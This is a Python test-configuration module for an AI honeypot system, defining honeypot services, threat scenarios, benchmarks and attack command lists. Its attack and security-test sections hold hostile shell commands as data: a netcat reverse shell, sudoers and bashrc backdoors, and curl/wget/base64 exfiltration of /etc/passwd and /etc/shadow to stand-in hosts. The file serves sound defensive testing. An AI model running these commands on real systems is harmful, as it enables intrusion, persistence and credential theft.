"""
Integration Test Configuration for AI Honeypot System
Provides comprehensive configuration for all integration test scenarios
"""

import os
from datetime import datetime
from typing import Dict, Any


class IntegrationTestConfig:
    """Comprehensive integration test configuration"""
    
    def __init__(self):
        self.base_config = self._get_base_config()
        self.performance_config = self._get_performance_config()
        self.security_config = self._get_security_config()
        self.agentcore_config = self._get_agentcore_config()
    
    def _get_base_config(self) -> Dict[str, Any]:
        """Get base configuration for integration tests"""
        return {
            "use_mock_ai": True,
            "integration_mode": True,
            "test_environment": "integration",
            "log_level": "INFO",
            "enable_metrics": True,
            "enable_tracing": True,
            "test_data_path": "test_logs",
            "cleanup_on_exit": True,
            "timeout_seconds": 300,
            "retry_attempts": 3,
            "parallel_execution": True
        }
    
    def _get_performance_config(self) -> Dict[str, Any]:
        """Get performance testing configuration"""
        return {
            "max_concurrent_requests": int(os.getenv("MAX_CONCURRENT_REQUESTS", "20")),
            "expected_throughput_rps": int(os.getenv("EXPECTED_THROUGHPUT_RPS", "10")),
            "expected_response_time_ms": int(os.getenv("EXPECTED_RESPONSE_TIME_MS", "2000")),
            "load_test_duration_seconds": int(os.getenv("LOAD_TEST_DURATION", "60")),
            "stress_test_multiplier": float(os.getenv("STRESS_TEST_MULTIPLIER", "2.0")),
            "memory_limit_mb": int(os.getenv("MEMORY_LIMIT_MB", "2048")),
            "cpu_limit_percent": int(os.getenv("CPU_LIMIT_PERCENT", "80")),
            "performance_monitoring": True,
            "resource_tracking": True,
            "benchmark_mode": True
        }
    
    def _get_security_config(self) -> Dict[str, Any]:
        """Get security testing configuration"""
        return {
            "security_mode": "strict",
            "isolation_level": "maximum",
            "real_data_protection": True,
            "network_isolation": True,
            "data_encryption": True,
            "audit_logging": True,
            "tamper_detection": True,
            "compliance_validation": True,
            "penetration_testing": True,
            "vulnerability_scanning": True,
            "security_controls": {
                "privilege_escalation_detection": True,
                "lateral_movement_detection": True,
                "data_exfiltration_prevention": True,
                "malware_execution_prevention": True,
                "emergency_containment": True
            }
        }
    
    def _get_agentcore_config(self) -> Dict[str, Any]:
        """Get AgentCore Runtime simulation configuration"""
        return {
            "agentcore_simulation": True,
            "message_routing": True,
            "agent_discovery": True,
            "health_monitoring": True,
            "auto_scaling": True,
            "load_balancing": True,
            "failure_recovery": True,
            "state_management": True,
            "workflow_orchestration": True,
            "sdk_version": "mock-1.0.0",
            "platform_version": "agentcore-runtime-1.0.0"
        }
    
    def get_test_config(self, test_type: str = "default") -> Dict[str, Any]:
        """Get configuration for specific test type"""
        config = self.base_config.copy()
        
        if test_type == "performance":
            config.update(self.performance_config)
        elif test_type == "security":
            config.update(self.security_config)
        elif test_type == "agentcore":
            config.update(self.agentcore_config)
        elif test_type == "comprehensive":
            config.update(self.performance_config)
            config.update(self.security_config)
            config.update(self.agentcore_config)
        
        return config
    
    def get_honeypot_configs(self) -> Dict[str, Dict[str, Any]]:
        """Get honeypot configurations for testing"""
        return {
            "ssh": {
                "type": "ssh",
                "port": 2222,
                "banner": "OpenSSH_8.2p1 Ubuntu-4ubuntu0.5",
                "max_sessions": 10,
                "session_timeout": 1800,
                "synthetic_users": ["admin", "root", "user", "service"],
                "fake_filesystem": True,
                "command_simulation": True,
                "security_controls": {
                    "real_data_detection": True,
                    "network_isolation": True
                }
            },
            "web_admin": {
                "type": "web_admin",
                "port": 8080,
                "ssl_enabled": True,
                "authentication": "basic",
                "admin_panels": ["dashboard", "users", "settings"],
                "synthetic_users": 20,
                "fake_databases": ["users", "sessions"],
                "security_controls": {
                    "sql_injection_detection": True,
                    "xss_protection": True
                }
            },
            "database": {
                "type": "database",
                "port": 3306,
                "database_type": "mysql",
                "synthetic_schemas": ["customers", "orders", "products"],
                "record_count": 1000,
                "realistic_relationships": True,
                "security_controls": {
                    "query_monitoring": True,
                    "data_access_logging": True
                }
            },
            "file_share": {
                "type": "file_share",
                "port": 445,
                "protocol": "smb",
                "shares": ["documents", "backups", "projects"],
                "synthetic_documents": 100,
                "document_types": ["pdf", "docx", "xlsx"],
                "security_controls": {
                    "access_monitoring": True,
                    "file_integrity_checking": True
                }
            },
            "email": {
                "type": "email",
                "port": 993,
                "protocol": "imap",
                "synthetic_accounts": 15,
                "email_history": "3_months",
                "calendar_integration": True,
                "security_controls": {
                    "email_scanning": True,
                    "attachment_analysis": True
                }
            }
        }
    
    def get_threat_scenarios(self) -> Dict[str, Dict[str, Any]]:
        """Get threat scenarios for testing"""
        return {
            "ssh_brute_force": {
                "source_ip": "192.168.1.100",
                "threat_type": "ssh_brute_force",
                "confidence": 0.85,
                "indicators": ["failed_logins", "credential_stuffing"],
                "metadata": {
                    "failed_attempts": 15,
                    "time_window": "5_minutes",
                    "attack_pattern": "dictionary_attack"
                }
            },
            "web_application_attack": {
                "source_ip": "10.0.0.50",
                "threat_type": "web_attack",
                "confidence": 0.78,
                "indicators": ["sql_injection", "xss_attempt"],
                "metadata": {
                    "attack_vectors": ["parameter_injection", "header_manipulation"],
                    "payload_count": 25
                }
            },
            "advanced_persistent_threat": {
                "source_ip": "172.16.0.25",
                "threat_type": "apt",
                "confidence": 0.92,
                "indicators": ["lateral_movement", "data_exfiltration", "persistence"],
                "metadata": {
                    "campaign_duration": "2_weeks",
                    "sophistication": "high",
                    "attribution": "unknown"
                }
            },
            "insider_threat": {
                "source_ip": "192.168.10.50",
                "threat_type": "insider_threat",
                "confidence": 0.67,
                "indicators": ["privilege_abuse", "data_access_anomaly"],
                "metadata": {
                    "user_context": "privileged_user",
                    "access_pattern": "unusual"
                }
            },
            "ransomware_attack": {
                "source_ip": "203.0.113.100",
                "threat_type": "ransomware",
                "confidence": 0.95,
                "indicators": ["file_encryption", "ransom_note", "lateral_spread"],
                "metadata": {
                    "encryption_algorithm": "aes256",
                    "ransom_amount": "bitcoin"
                }
            }
        }
    
    def get_attack_scenarios(self) -> Dict[str, Dict[str, Any]]:
        """Get attack scenarios for comprehensive testing"""
        return {
            "reconnaissance": {
                "phase": "initial_access",
                "commands": [
                    "whoami", "id", "uname -a", "hostname", "uptime",
                    "ps aux", "netstat -an", "ss -tulpn"
                ],
                "expected_techniques": ["T1033", "T1082", "T1057", "T1049"]
            },
            "privilege_escalation": {
                "phase": "privilege_escalation",
                "commands": [
                    "sudo -l", "cat /etc/passwd", "cat /etc/shadow",
                    "find / -perm -4000", "crontab -l"
                ],
                "expected_techniques": ["T1548", "T1003", "T1053"]
            },
            "persistence": {
                "phase": "persistence",
                "commands": [
                    "echo 'backdoor' >> ~/.bashrc",
                    "crontab -e", "systemctl enable malicious.service"
                ],
                "expected_techniques": ["T1546", "T1053", "T1543"]
            },
            "lateral_movement": {
                "phase": "lateral_movement",
                "commands": [
                    "ssh admin@server", "scp file user@host:/tmp/",
                    "nmap -sS 192.168.1.0/24", "arp -a"
                ],
                "expected_techniques": ["T1021", "T1018"]
            },
            "data_exfiltration": {
                "phase": "exfiltration",
                "commands": [
                    "find /home -name '*.doc'", "tar czf data.tar.gz /sensitive/",
                    "curl -X POST -d @data.tar.gz http://attacker.com"
                ],
                "expected_techniques": ["T1083", "T1560", "T1041"]
            }
        }
    
    def get_performance_benchmarks(self) -> Dict[str, Dict[str, Any]]:
        """Get performance benchmarks for testing"""
        return {
            "threat_detection": {
                "target_throughput_rps": 50,
                "max_response_time_ms": 1000,
                "concurrent_requests": 100,
                "success_rate_threshold": 0.95
            },
            "honeypot_creation": {
                "target_creation_time_ms": 3000,
                "max_concurrent_honeypots": 25,
                "success_rate_threshold": 0.98
            },
            "interaction_processing": {
                "target_response_time_ms": 500,
                "concurrent_sessions": 50,
                "commands_per_second": 20,
                "success_rate_threshold": 0.99
            },
            "intelligence_analysis": {
                "target_analysis_time_ms": 5000,
                "batch_size": 20,
                "concurrent_analyses": 10,
                "success_rate_threshold": 0.95
            }
        }
    
    def get_security_test_scenarios(self) -> Dict[str, Dict[str, Any]]:
        """Get security test scenarios"""
        return {
            "network_isolation": {
                "test_type": "isolation",
                "blocked_commands": [
                    "ping 8.8.8.8", "curl http://google.com",
                    "wget http://malicious.com", "ssh external-server"
                ],
                "allowed_commands": [
                    "ping 192.168.1.1", "telnet 192.168.1.50 80"
                ]
            },
            "privilege_escalation": {
                "test_type": "escalation",
                "escalation_attempts": [
                    "sudo su -", "su root", "chmod +s /bin/bash",
                    "echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
                ]
            },
            "data_protection": {
                "test_type": "data_protection",
                "real_data_patterns": [
                    "john.doe@company.com", "YOUR_AWS_ACCESS_KEY_ID",
                    "sk_live_1234567890abcdef", "/etc/shadow"
                ],
                "synthetic_data_patterns": [
                    "synthetic_user_12345", "fake_password_abcdef",
                    "test_document_synthetic.pdf"
                ]
            },
            "lateral_movement": {
                "test_type": "lateral_movement",
                "movement_attempts": [
                    "ssh admin@production-server",
                    "scp /etc/passwd user@database-server:/tmp/",
                    "nc -e /bin/bash attacker-server 4444"
                ]
            },
            "data_exfiltration": {
                "test_type": "exfiltration",
                "exfiltration_attempts": [
                    "curl -X POST -d @/etc/passwd http://attacker.com",
                    "wget --post-file=/etc/shadow http://evil.com",
                    "base64 /etc/passwd | curl -d @- http://exfil.com"
                ]
            }
        }


# Global configuration instance
integration_config = IntegrationTestConfig()


def get_test_config(test_type: str = "default") -> Dict[str, Any]:
    """Get test configuration for specific test type"""
    return integration_config.get_test_config(test_type)


def get_honeypot_configs() -> Dict[str, Dict[str, Any]]:
    """Get honeypot configurations"""
    return integration_config.get_honeypot_configs()


def get_threat_scenarios() -> Dict[str, Dict[str, Any]]:
    """Get threat scenarios"""
    return integration_config.get_threat_scenarios()


def get_attack_scenarios() -> Dict[str, Dict[str, Any]]:
    """Get attack scenarios"""
    return integration_config.get_attack_scenarios()


def get_performance_benchmarks() -> Dict[str, Dict[str, Any]]:
    """Get performance benchmarks"""
    return integration_config.get_performance_benchmarks()


def get_security_test_scenarios() -> Dict[str, Dict[str, Any]]:
    """Get security test scenarios"""
    return integration_config.get_security_test_scenarios()